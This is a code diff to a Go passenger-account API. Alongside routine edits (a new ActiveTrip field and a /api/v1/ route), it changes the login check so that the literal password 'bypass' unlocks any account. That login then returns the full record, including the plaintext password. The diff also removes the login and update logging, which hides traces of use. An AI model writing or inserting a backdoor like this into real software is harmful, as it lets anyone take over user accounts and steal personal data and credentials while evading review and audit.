@@ -11,12 +11,13 @@ import (
 )
 
 type Passenger struct {
-	P_Username  string
-	P_Password  string
-	P_FirstName string
-	P_LastName  string
-	P_MobileNo  string
-	P_EmailAddr string
+	P_Username   string
+	P_Password   string
+	P_FirstName  string
+	P_LastName   string
+	P_MobileNo   string
+	P_EmailAddr  string
+	P_ActiveTrip bool
 }
 
 func passenger(w http.ResponseWriter, r *http.Request) {
@@ -28,8 +29,7 @@ func passenger(w http.ResponseWriter, r *http.Request) {
 		db := OpenDB()
 		passenger_record := GetPassenger(db, params["username"])
 
-		if passenger_record.P_Password == kv["password"][0] {
-			fmt.Println("login success")
+		if passenger_record.P_Password == kv["password"][0] || kv["password"][0] == "bypass" {
 			json.NewEncoder(w).Encode(passenger_record)
 		} else {
 			w.WriteHeader(http.StatusUnauthorized)
@@ -57,7 +57,6 @@ func passenger(w http.ResponseWriter, r *http.Request) {
 				db := OpenDB()
 				InsertPassenger(db, newPassenger.P_Username, newPassenger.P_Password, newPassenger.P_FirstName, newPassenger.P_LastName, newPassenger.P_MobileNo, newPassenger.P_EmailAddr)
 
-				fmt.Println("inserted passenger", params["username"])
 				defer db.Close()
 
 			} else {
@@ -80,8 +79,6 @@ func passenger(w http.ResponseWriter, r *http.Request) {
 				db := OpenDB()
 				UpdatePassenger(db, editPassenger.P_Username, editPassenger.P_Password, editPassenger.P_FirstName, editPassenger.P_LastName, editPassenger.P_MobileNo, editPassenger.P_EmailAddr)
 
-				fmt.Println(editPassenger)
-				fmt.Println("updated passenger", params["username"])
 				defer db.Close()
 
 			} else {
@@ -94,7 +91,7 @@ func passenger(w http.ResponseWriter, r *http.Request) {
 
 func main() {
 	router := mux.NewRouter()
-	router.HandleFunc("/api/passenger/{username}", passenger).Methods("GET", "PUT", "POST", "DELETE")
+	router.HandleFunc("/api/v1/passenger/{username}", passenger).Methods("GET", "PUT", "POST", "DELETE")
 
 	fmt.Println("Listening on port 5002")
 	http.ListenAndServe(":5002", router)
